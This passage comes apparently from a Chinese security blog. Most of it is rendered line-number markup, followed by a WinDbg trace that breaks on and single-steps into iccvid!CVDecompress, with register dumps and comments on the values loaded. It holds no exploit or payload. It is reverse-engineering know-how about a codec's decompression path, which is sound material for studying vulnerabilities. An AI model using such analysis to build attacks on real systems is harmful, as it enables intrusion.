class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br><span class="line">1073</span><br><span class="line">1074</span><br><span class="line">1075</span><br><span class="line">1076</span><br><span class="line">1077</span><br><span class="line">1078</span><br><span class="line">1079</span><br><span class="line">1080</span><br><span class="line">1081</span><br><span class="line">1082</span><br><span class="line">1083</span><br><span class="line">1084</span><br><span class="line">1085</span><br><span class="line">1086</span><br><span class="line">1087</span><br><span class="line">1088</span><br><span class="line">1089</span><br><span class="line">1090</span><br><span class="line">1091</span><br><span class="line">1092</span><br><span class="line">1093</span><br><span class="line">1094</span><br><span class="line">1095</span><br><span class="line">1096</span><br><span class="line">1097</span><br><span class="line">1098</span><br><span class="line">1099</span><br><span class="line">1100</span><br><span class="line">1101</span><br><span class="line">1102</span><br><span class="line">1103</span><br><span class="line">1104</span><br><span class="line">1105</span><br><span class="line">1106</span><br><span class="line">1107</span><br><span class="line">1108</span><br><span class="line">1109</span><br><span class="line">1110</span><br><span class="line">1111</span><br><span class="line">1112</span><br><span class="line">1113</span><br><span class="line">1114</span><br><span class="line">1115</span><br><span class="line">1116</span><br><span class="line">1117</span><br><span class="line">1118</span><br><span class="line">1119</span><br><span class="line">1120</span><br><span class="line">1121</span><br><span class="line">1122</span><br><span class="line">1123</span><br><span class="line">1124</span><br><span class="line">1125</span><br><span class="line">1126</span><br><span class="line">1127</span><br><span class="line">1128</span><br><span class="line">1129</span><br><span class="line">1130</span><br><span class="line">1131</span><br><span class="line">1132</span><br><span class="line">1133</span><br><span class="line">1134</span><br><span class="line">1135</span><br><span class="line">1136</span><br><span class="line">1137</span><br><span class="line">1138</span><br><span class="line">1139</span><br><span class="line">1140</span><br><span class="line">1141</span><br><span class="line">1142</span><br><span class="line">1143</span><br><span class="line">1144</span><br><span class="line">1145</span><br><span class="line">1146</span><br><span class="line">1147</span><br><span class="line">1148</span><br><span class="line">1149</span><br><span class="line">1150</span><br><span class="line">1151</span><br><span class="line">1152</span><br><span class="line">1153</span><br><span class="line">1154</span><br><span class="line">1155</span><br><span class="line">1156</span><br><span class="line">1157</span><br><span class="line">1158</span><br><span class="line">1159</span><br><span class="line">1160</span><br><span class="line">1161</span><br><span class="line">1162</span><br><span class="line">1163</span><br><span class="line">1164</span><br><span class="line">1165</span><br><span class="line">1166</span><br><span class="line">1167</span><br><span class="line">1168</span><br><span class="line">1169</span><br><span class="line">1170</span><br><span class="line">1171</span><br><span class="line">1172</span><br><span class="line">1173</span><br><span class="line">1174</span><br><span class="line">1175</span><br><span class="line">1176</span><br><span class="line">1177</span><br><span class="line">1178</span><br><span class="line">1179</span><br><span class="line">1180</span><br><span class="line">1181</span><br><span class="line">1182</span><br><span class="line">1183</span><br><span class="line">1184</span><br><span class="line">1185</span><br><span class="line">1186</span><br><span class="line">1187</span><br><span class="line">1188</span><br><span class="line">1189</span><br><span class="line">1190</span><br><span class="line">1191</span><br><span class="line">1192</span><br><span class="line">1193</span><br><span class="line">1194</span><br><span class="line">1195</span><br><span class="line">1196</span><br><span class="line">1197</span><br><span class="line">1198</span><br><span class="line">1199</span><br><span class="line">1200</span><br><span class="line">1201</span><br><span class="line">1202</span><br><span class="line">1203</span><br><span class="line">1204</span><br><span class="line">1205</span><br><span class="line">1206</span><br><span class="line">1207</span><br><span class="line">1208</span><br><span class="line">1209</span><br><span class="line">1210</span><br><span class="line">1211</span><br><span class="line">1212</span><br><span class="line">1213</span><br><span class="line">1214</span><br><span class="line">1215</span><br><span class="line">1216</span><br><span class="line">1217</span><br><span class="line">1218</span><br><span class="line">1219</span><br><span class="line">1220</span><br><span class="line">1221</span><br><span class="line">1222</span><br><span class="line">1223</span><br><span class="line">1224</span><br><span class="line">1225</span><br><span class="line">1226</span><br><span class="line">1227</span><br><span class="line">1228</span><br><span class="line">1229</span><br><span class="line">1230</span><br><span class="line">1231</span><br><span class="line">1232</span><br><span class="line">1233</span><br><span class="line">1234</span><br><span class="line">1235</span><br><span class="line">1236</span><br><span class="line">1237</span><br><span class="line">1238</span><br><span class="line">1239</span><br><span class="line">1240</span><br><span class="line">1241</span><br><span class="line">1242</span><br><span class="line">1243</span><br><span class="line">1244</span><br><span class="line">1245</span><br><span class="line">1246</span><br><span class="line">1247</span><br><span class="line">1248</span><br><span class="line">1249</span><br><span class="line">1250</span><br><span class="line">1251</span><br><span class="line">1252</span><br><span class="line">1253</span><br><span class="line">1254</span><br><span class="line">1255</span><br><span class="line">1256</span><br><span class="line">1257</span><br><span class="line">1258</span><br><span class="line">1259</span><br><span class="line">1260</span><br><span class="line">1261</span><br><span class="line">1262</span><br><span class="line">1263</span><br><span class="line">1264</span><br><span class="line">1265</span><br><span class="line">1266</span><br><span class="line">1267</span><br><span class="line">1268</span><br><span class="line">1269</span><br><span class="line">1270</span><br><span class="line">1271</span><br><span class="line">1272</span><br><span class="line">1273</span><br><span class="line">1274</span><br><span class="line">1275</span><br><span class="line">1276</span><br><span class="line">1277</span><br><span class="line">1278</span><br><span class="line">1279</span><br><span class="line">1280</span><br><span class="line">1281</span><br><span class="line">1282</span><br><span class="line">1283</span><br><span class="line">1284</span><br><span class="line">1285</span><br><span class="line">1286</span><br><span class="line">1287</span><br><span class="line">1288</span><br><span class="line">1289</span><br><span class="line">1290</span><br><span class="line">1291</span><br><span class="line">1292</span><br><span class="line">1293</span><br><span class="line">1294</span><br><span class="line">1295</span><br><span class="line">1296</span><br><span class="line">1297</span><br><span class="line">1298</span><br><span class="line">1299</span><br><span class="line">1300</span><br><span class="line">1301</span><br><span class="line">1302</span><br><span class="line">1303</span><br><span class="line">1304</span><br><span class="line">1305</span><br><span class="line">1306</span><br><span class="line">1307</span><br><span class="line">1308</span><br><span class="line">1309</span><br><span class="line">1310</span><br><span class="line">1311</span><br><span class="line">1312</span><br><span class="line">1313</span><br><span class="line">1314</span><br><span class="line">1315</span><br><span class="line">1316</span><br><span class="line">1317</span><br><span class="line">1318</span><br><span class="line">1319</span><br><span class="line">1320</span><br><span class="line">1321</span><br><span class="line">1322</span><br><span class="line">1323</span><br><span class="line">1324</span><br><span class="line">1325</span><br><span class="line">1326</span><br><span class="line">1327</span><br><span class="line">1328</span><br><span class="line">1329</span><br><span class="line">1330</span><br><span class="line">1331</span><br><span class="line">1332</span><br><span class="line">1333</span><br><span class="line">1334</span><br><span class="line">1335</span><br><span class="line">1336</span><br><span class="line">1337</span><br><span class="line">1338</span><br><span class="line">1339</span><br><span class="line">1340</span><br><span class="line">1341</span><br><span class="line">1342</span><br><span class="line">1343</span><br><span class="line">1344</span><br><span class="line">1345</span><br><span class="line">1346</span><br><span class="line">1347</span><br><span class="line">1348</span><br><span class="line">1349</span><br><span class="line">1350</span><br><span class="line">1351</span><br><span class="line">1352</span><br><span class="line">1353</span><br><span class="line">1354</span><br><span class="line">1355</span><br><span class="line">1356</span><br><span class="line">1357</span><br><span class="line">1358</span><br><span class="line">1359</span><br><span class="line">1360</span><br><span class="line">1361</span><br><span class="line">1362</span><br><span class="line">1363</span><br><span class="line">1364</span><br><span class="line">1365</span><br><span class="line">1366</span><br><span class="line">1367</span><br><span class="line">1368</span><br><span class="line">1369</span><br><span class="line">1370</span><br><span class="line">1371</span><br><span class="line">1372</span><br><span class="line">1373</span><br><span class="line">1374</span><br><span class="line">1375</span><br><span class="line">1376</span><br><span class="line">1377</span><br><span class="line">1378</span><br><span class="line">1379</span><br><span class="line">1380</span><br><span class="line">1381</span><br><span class="line">1382</span><br><span class="line">1383</span><br><span class="line">1384</span><br><span class="line">1385</span><br><span class="line">1386</span><br><span class="line">1387</span><br><span class="line">1388</span><br><span class="line">1389</span><br><span class="line">1390</span><br><span class="line">1391</span><br><span class="line">1392</span><br><span class="line">1393</span><br><span class="line">1394</span><br><span class="line">1395</span><br><span class="line">1396</span><br><span class="line">1397</span><br><span class="line">1398</span><br><span class="line">1399</span><br><span class="line">1400</span><br><span class="line">1401</span><br><span class="line">1402</span><br><span class="line">1403</span><br><span class="line">1404</span><br><span class="line">1405</span><br><span class="line">1406</span><br><span class="line">1407</span><br><span class="line">1408</span><br><span class="line">1409</span><br><span class="line">1410</span><br><span class="line">1411</span><br><span class="line">1412</span><br><span class="line">1413</span><br><span class="line">1414</span><br><span class="line">1415</span><br><span class="line">1416</span><br><span class="line">1417</span><br><span class="line">1418</span><br><span class="line">1419</span><br><span class="line">1420</span><br><span class="line">1421</span><br><span class="line">1422</span><br><span class="line">1423</span><br><span class="line">1424</span><br><span class="line">1425</span><br><span class="line">1426</span><br><span class="line">1427</span><br><span class="line">1428</span><br><span class="line">1429</span><br><span class="line">1430</span><br><span class="line">1431</span><br><span class="line">1432</span><br><span class="line">1433</span><br><span class="line">1434</span><br><span class="line">1435</span><br><span class="line">1436</span><br><span class="line">1437</span><br><span class="line">1438</span><br><span class="line">1439</span><br><span class="line">1440</span><br><span class="line">1441</span><br><span class="line">1442</span><br><span class="line">1443</span><br><span class="line">1444</span><br><span class="line">1445</span><br><span class="line">1446</span><br><span class="line">1447</span><br><span class="line">1448</span><br><span class="line">1449</span><br><span class="line">1450</span><br><span class="line">1451</span><br><span class="line">1452</span><br><span class="line">1453</span><br><span class="line">1454</span><br><span class="line">1455</span><br><span class="line">1456</span><br><span class="line">1457</span><br><span class="line">1458</span><br><span class="line">1459</span><br><span class="line">1460</span><br><span class="line">1461</span><br><span class="line">1462</span><br><span class="line">1463</span><br><span class="line">1464</span><br><span class="line">1465</span><br><span class="line">1466</span><br><span class="line">1467</span><br><span class="line">1468</span><br><span class="line">1469</span><br><span class="line">1470</span><br><span class="line">1471</span><br><span class="line">1472</span><br><span class="line">1473</span><br><span class="line">1474</span><br><span class="line">1475</span><br><span class="line">1476</span><br><span class="line">1477</span><br><span class="line">1478</span><br><span class="line">1479</span><br><span class="line">1480</span><br><span class="line">1481</span><br><span class="line">1482</span><br><span class="line">1483</span><br><span class="line">1484</span><br><span class="line">1485</span><br><span class="line">1486</span><br><span class="line">1487</span><br><span class="line">1488</span><br><span class="line">1489</span><br><span class="line">1490</span><br><span class="line">1491</span><br><span class="line">1492</span><br><span class="line">1493</span><br><span class="line">1494</span><br><span class="line">1495</span><br><span class="line">1496</span><br><span class="line">1497</span><br><span class="line">1498</span><br><span class="line">1499</span><br><span class="line">1500</span><br><span class="line">1501</span><br><span class="line">1502</span><br><span class="line">1503</span><br><span class="line">1504</span><br><span class="line">1505</span><br><span class="line">1506</span><br><span class="line">1507</span><br><span class="line">1508</span><br><span class="line">1509</span><br><span class="line">1510</span><br><span class="line">1511</span><br><span class="line">1512</span><br><span class="line">1513</span><br><span class="line">1514</span><br><span class="line">1515</span><br><span class="line">1516</span><br><span class="line">1517</span><br><span class="line">1518</span><br><span class="line">1519</span><br><span class="line">1520</span><br><span class="line">1521</span><br><span class="line">1522</span><br><span class="line">1523</span><br><span class="line">1524</span><br><span class="line">1525</span><br><span class="line">1526</span><br><span class="line">1527</span><br><span class="line">1528</span><br><span class="line">1529</span><br><span class="line">1530</span><br><span class="line">1531</span><br><span class="line">1532</span><br><span class="line">1533</span><br><span class="line">1534</span><br><span class="line">1535</span><br><span class="line">1536</span><br><span class="line">1537</span><br><span class="line">1538</span><br><span class="line">1539</span><br><span class="line">1540</span><br><span class="line">1541</span><br><span class="line">1542</span><br><span class="line">1543</span><br><span class="line">1544</span><br><span class="line">1545</span><br><span class="line">1546</span><br><span class="line">1547</span><br><span class="line">1548</span><br><span class="line">1549</span><br><span class="line">1550</span><br><span class="line">1551</span><br><span class="line">1552</span><br><span class="line">1553</span><br><span class="line">1554</span><br><span class="line">1555</span><br><span class="line">1556</span><br><span class="line">1557</span><br><span class="line">1558</span><br><span class="line">1559</span><br><span class="line">1560</span><br><span class="line">1561</span><br><span class="line">1562</span><br><span class="line">1563</span><br><span class="line">1564</span><br><span class="line">1565</span><br><span class="line">1566</span><br><span class="line">1567</span><br><span class="line">1568</span><br><span class="line">1569</span><br><span class="line">1570</span><br><span class="line">1571</span><br><span class="line">1572</span><br><span class="line">1573</span><br><span class="line">1574</span><br><span class="line">1575</span><br><span class="line">1576</span><br><span class="line">1577</span><br><span class="line">1578</span><br><span class="line">1579</span><br><span class="line">1580</span><br><span class="line">1581</span><br><span class="line">1582</span><br><span class="line">1583</span><br><span class="line">1584</span><br><span class="line">1585</span><br><span class="line">1586</span><br><span class="line">1587</span><br><span class="line">1588</span><br><span class="line">1589</span><br><span class="line">1590</span><br><span class="line">1591</span><br><span class="line">1592</span><br><span class="line">1593</span><br><span class="line">1594</span><br><span class="line">1595</span><br><span class="line">1596</span><br><span class="line">1597</span><br><span class="line">1598</span><br><span class="line">1599</span><br><span class="line">1600</span><br><span class="line">1601</span><br><span class="line">1602</span><br><span class="line">1603</span><br><span class="line">1604</span><br><span class="line">1605</span><br><span class="line">1606</span><br><span class="line">1607</span><br><span class="line">1608</span><br><span class="line">1609</span><br><span class="line">1610</span><br><span class="line">1611</span><br><span class="line">1612</span><br><span class="line">1613</span><br><span class="line">1614</span><br><span class="line">1615</span><br><span class="line">1616</span><br><span class="line">1617</span><br><span class="line">1618</span><br><span class="line">1619</span><br><span class="line">1620</span><br><span class="line">1621</span><br><span class="line">1622</span><br><span class="line">1623</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">010</span>&gt; <span class="built_in">bp</span> 73b7cbee                                                              <span class="comment">; [73b7cbee call iccvid!CVDecompress (73b721ae)]</span></span><br><span class="line"><span class="number">0</span>:<span class="number">010</span>&gt; <span class="built_in">bl</span></span><br><span class="line"> <span class="number">0</span> e 73b7cbee     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** iccvid!Decompress+<span class="number">0x118</span></span><br><span class="line"><span class="number">0</span>:<span class="number">010</span>&gt; g</span><br><span class="line">Breakpoint <span class="number">0</span> hit</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=025afd88 <span class="built_in">ecx</span>=0005e2c0 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00127e40 <span class="built_in">edi</span>=<span class="number">02310050</span></span><br><span class="line"><span class="built_in">eip</span>=73b7cbee <span class="built_in">esp</span>=025afd38 <span class="built_in">ebp</span>=025afd60 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!Decompress+<span class="number">0x118</span>:</span><br><span class="line">73b7cbee e8bb55ffff      <span class="keyword">call</span>    iccvid!CVDecompress (73b721ae)</span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; t</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=025afd88 <span class="built_in">ecx</span>=0005e2c0 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00127e40 <span class="built_in">edi</span>=<span class="number">02310050</span></span><br><span class="line"><span class="built_in">eip</span>=73b721ae <span class="built_in">esp</span>=025afd34 <span class="built_in">ebp</span>=025afd60 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress:</span><br><span class="line">73b721ae 8bff            <span class="keyword">mov</span>     <span class="built_in">edi</span>,<span class="built_in">edi</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=025afd88 <span class="built_in">ecx</span>=0005e2c0 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00127e40 <span class="built_in">edi</span>=<span class="number">02310050</span></span><br><span class="line"><span class="built_in">eip</span>=73b721b0 <span class="built_in">esp</span>=025afd34 <span class="built_in">ebp</span>=025afd60 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x2</span>:</span><br><span class="line">73b721b0 <span class="number">55</span>              <span class="keyword">push</span>    <span class="built_in">ebp</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=025afd88 <span class="built_in">ecx</span>=0005e2c0 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00127e40 <span class="built_in">edi</span>=<span class="number">02310050</span></span><br><span class="line"><span class="built_in">eip</span>=73b721b1 <span class="built_in">esp</span>=025afd30 <span class="built_in">ebp</span>=025afd60 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x3</span>:</span><br><span class="line">73b721b1 8bec            <span class="keyword">mov</span>     <span class="built_in">ebp</span>,<span class="built_in">esp</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=025afd88 <span class="built_in">ecx</span>=0005e2c0 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00127e40 <span class="built_in">edi</span>=<span class="number">02310050</span></span><br><span class="line"><span class="built_in">eip</span>=73b721b3 <span class="built_in">esp</span>=025afd30 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x5</span>:</span><br><span class="line">73b721b3 83ec20          <span class="keyword">sub</span>     <span class="built_in">esp</span>,<span class="number">20h</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=025afd88 <span class="built_in">ecx</span>=0005e2c0 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00127e40 <span class="built_in">edi</span>=<span class="number">02310050</span></span><br><span class="line"><span class="built_in">eip</span>=73b721b6 <span class="built_in">esp</span>=025afd10 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x8</span>:</span><br><span class="line">73b721b6 <span class="number">53</span>              <span class="keyword">push</span>    <span class="built_in">ebx</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=025afd88 <span class="built_in">ecx</span>=0005e2c0 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00127e40 <span class="built_in">edi</span>=<span class="number">02310050</span></span><br><span class="line"><span class="built_in">eip</span>=73b721b7 <span class="built_in">esp</span>=025afd0c <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x9</span>:</span><br><span class="line">73b721b7 8b5d08          <span class="keyword">mov</span>     <span class="built_in">ebx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">8</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd38=001535b0    <span class="comment">; ebx = a1 = 0x001535b0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0005e2c0 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00127e40 <span class="built_in">edi</span>=<span class="number">02310050</span></span><br><span class="line"><span class="built_in">eip</span>=73b721ba <span class="built_in">esp</span>=025afd0c <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xc</span>:</span><br><span class="line">73b721ba <span class="number">56</span>              <span class="keyword">push</span>    <span class="built_in">esi</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0005e2c0 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00127e40 <span class="built_in">edi</span>=<span class="number">02310050</span></span><br><span class="line"><span class="built_in">eip</span>=73b721bb <span class="built_in">esp</span>=025afd08 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xd</span>:</span><br><span class="line">73b721bb 8b7324          <span class="keyword">mov</span>     <span class="built_in">esi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>+<span class="number">24h</span>] <span class="built_in">ds</span>:<span class="number">0023</span>:001535d4=<span class="number">00000000</span>  <span class="comment">; esi = [0x001535b0+0x24] = 0x00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0005e2c0 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">02310050</span></span><br><span class="line"><span class="built_in">eip</span>=73b721be <span class="built_in">esp</span>=025afd08 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x10</span>:</span><br><span class="line">73b721be <span class="number">57</span>              <span class="keyword">push</span>    <span class="built_in">edi</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0005e2c0 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">02310050</span></span><br><span class="line"><span class="built_in">eip</span>=73b721bf <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x11</span>:</span><br><span class="line">73b721bf 33ff            <span class="keyword">xor</span>     <span class="built_in">edi</span>,<span class="built_in">edi</span>                                        <span class="comment">; edi = 0x00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0005e2c0 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b721c1 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x13</span>:</span><br><span class="line">73b721c1 3bf7            <span class="keyword">cmp</span>     <span class="built_in">esi</span>,<span class="built_in">edi</span>                                        <span class="comment">; 判断esi是否为0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0005e2c0 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span 